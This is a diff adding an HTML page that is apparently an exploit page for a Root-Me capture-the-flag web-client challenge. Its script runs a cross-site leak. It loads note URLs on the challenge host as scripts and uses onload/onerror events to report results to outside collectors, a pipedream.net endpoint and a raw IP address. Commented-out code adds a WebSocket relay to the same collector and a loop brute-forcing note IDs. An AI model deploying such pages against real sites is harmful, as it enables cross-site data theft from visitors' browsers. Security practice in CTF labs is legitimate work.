@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="../JS/script.js" defer></script>
+    <!-- <link rel="stylesheet" href="../css/evil.css"> -->
+    <title>Symphony</title>
+</head>
+
+<body>
+    <!-- <script>
+        websocket = new WebSocket('ws://ctf22.root-me.org/ws')
+        websocket.onopen = start
+        websocket.onmessage = handleReply
+        function start(event) {
+            websocket.send("random");
+        }
+        function handleReply(event) {
+            fetch('https://eoba3aqmrw0ajf6.m.pipedream.net/?' + event.data, { mode: 'no-cors' })
+        }
+
+    </script> -->
+    <script>
+        const leak = async (url, id) => {
+            return new Promise((r) => {
+                let s = document.createElement('script')
+                s.src = url
+                s.onload = (e) => {
+                    console.log('Onload event triggered at ' + url);
+                    fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
+                    e.target.remove()
+                    return r(0)
+                }
+                s.onerror = (e) => {
+                    console.log('Error event triggered');
+                    fetch(`http://91.173.39.199:25565/?error=${id}`)
+                    e.target.remove()
+                    return r(1)
+                }
+                document.head.appendChild(s)
+            })
+        }
+        // function probeError(url, id) {
+        //     let script = document.createElement('script');
+        //     script.src = url;
+        //     script.onload = () => {
+        //         console.log('Onload event triggered at ' + url);
+        //         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
+        //     }
+        //     script.onerror = () => {
+        //         console.log('Error event triggered');
+        //         fetch(`http://91.173.39.199:25565/?error=${id}`)
+        //     }
+        //     document.head.appendChild(script);
+        // }
+        // for (let id = 0; id <= 10000; id++) {
+        leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3201}`, 3201)
+// }
+
+    </script>
+    <h1 style="text-align: center;">-----------------------bienvenue----------------------</h1>
+    <input type="text" name="csrf" value="test">
+</body>
+
+</html>
